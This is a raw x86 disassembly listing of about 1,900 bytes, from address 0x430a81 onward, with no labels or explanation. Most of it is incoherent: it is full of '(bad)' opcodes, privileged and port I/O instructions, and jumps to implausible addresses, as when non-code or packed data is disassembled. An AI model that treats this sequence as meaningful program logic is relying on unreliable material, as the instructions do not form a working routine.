  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
